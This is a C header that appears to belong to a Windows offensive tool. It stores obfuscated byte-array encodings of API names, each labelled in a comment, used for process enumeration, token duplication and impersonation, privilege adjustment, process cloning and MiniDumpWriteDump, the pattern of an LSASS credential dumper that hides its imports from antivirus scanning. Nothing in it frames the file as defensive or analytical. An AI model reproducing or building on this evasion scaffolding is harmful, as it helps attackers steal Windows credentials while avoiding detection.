#pragma once

// "Process32FirstW"
static const unsigned char P32F_ENC[] = {
    0x60, 0x43, 0x5D, 0x50, 0x51, 0x46, 0x45, 0x04, 0x0A, 0x7F, 0x08, 0x10, 0x10, 0x10, 0x32
};

// "Process32NextW"
static const unsigned char P32N_ENC[] = {
    0x60, 0x43, 0x5D, 0x50, 0x51, 0x46, 0x45, 0x04, 0x0A, 0x77, 0x04, 0x1A, 0x17, 0x33
};

// "OpenProcess"
static const unsigned char OP_ENC[] = {
    0x7F, 0x41, 0x57, 0x5D, 0x64, 0x47, 0x59, 0x54, 0x5D, 0x4A, 0x12
};

// "GetProcAddress"
static const unsigned char GPA_ENC[] = {
    0x77, 0x54, 0x46, 0x63, 0x46, 0x5A, 0x55, 0x76, 0x5C, 0x5D, 0x13, 0x07, 0x10, 0x17
};

// "NtCreateProcessEx"
static const unsigned char NTCPE_ENC[] = {
    0x7E, 0x45, 0x71, 0x41, 0x51, 0x54, 0x42, 0x52, 0x68, 0x4B, 0x0E, 0x01, 0x06, 0x17, 0x16, 0x23, 0x1F
};

// "CreateToolhelp32Snapshot"
static const unsigned char CTH_ENC[] = {
    0x73, 0x43, 0x57, 0x52, 0x40, 0x50, 0x62, 0x58, 0x57, 0x55, 0x09, 0x07, 0x0F, 0x14, 0x56, 0x54, 0x34, 0x06, 0x08, 0x1A, 0x43, 0x59, 0x5D, 0x47
};

// "OpenProcessToken"
static const unsigned char OPTK_ENC[] = {
    0x7F, 0x41, 0x57, 0x5D, 0x64, 0x47, 0x59, 0x54, 0x5D, 0x4A, 0x12, 0x36, 0x0C, 0x0F, 0x00, 0x08
};

// "DuplicateTokenEx"
static const unsigned char DUPTOK_ENC[] = {
    0x74, 0x44, 0x42, 0x5F, 0x5D, 0x56, 0x57, 0x43, 0x5D, 0x6D, 0x0E, 0x09, 0x06, 0x0A, 0x20, 0x1E
};

// "ImpersonateLoggedOnUser"
static const unsigned char IMP_ENC[] = {
    0x79, 0x5C, 0x42, 0x56, 0x46, 0x46, 0x59, 0x59, 0x59, 0x4D, 0x04, 0x2E, 0x0C, 0x03, 0x02, 0x03, 0x03, 0x27, 0x07, 0x3F, 0x43, 0x54, 0x40
};

// "SetThreadToken"
static const unsigned char STT_ENC[] = {
    0x63, 0x54, 0x46, 0x67, 0x5C, 0x47, 0x53, 0x56, 0x5C, 0x6D, 0x0E, 0x09, 0x06, 0x0A
};

// "AdjustTokenPrivileges"
static const unsigned char ATP_ENC[] = {
    0x71, 0x55, 0x58, 0x46, 0x47, 0x41, 0x62, 0x58, 0x53, 0x5C, 0x0F, 0x32, 0x11, 0x0D, 0x13, 0x0F, 0x0B, 0x0D, 0x0E, 0x0F, 0x43
};

// "LookupPrivilegeValueW"
static const unsigned char LPVA_ENC[] = {
    0x7C, 0x5E, 0x5D, 0x58, 0x41, 0x45, 0x66, 0x45, 0x51, 0x4F, 0x08, 0x0E, 0x06, 0x03, 0x00, 0x30, 0x06, 0x04, 0x1C, 0x0F, 0x67
};

// "MiniDumpWriteDump"
static const unsigned char MDWD_ENC[] = {
    0x7D, 0x58, 0x5C, 0x5A, 0x70, 0x40, 0x5B, 0x47, 0x6F, 0x4B, 0x08, 0x16, 0x06, 0x20, 0x10, 0x0B, 0x17
};

// "GetProcessId"
static const unsigned char GPID_ENC[] = {
    0x77, 0x54, 0x46, 0x63, 0x46, 0x5A, 0x55, 0x52, 0x4B, 0x4A, 0x28, 0x06
};

// "GetCurrentProcess"
static const unsigned char GCP_ENC[] = {
    0x77, 0x54, 0x46, 0x70, 0x41, 0x47, 0x44, 0x52, 0x56, 0x4D, 0x31, 0x10, 0x0C, 0x07, 0x00, 0x15, 0x14
};
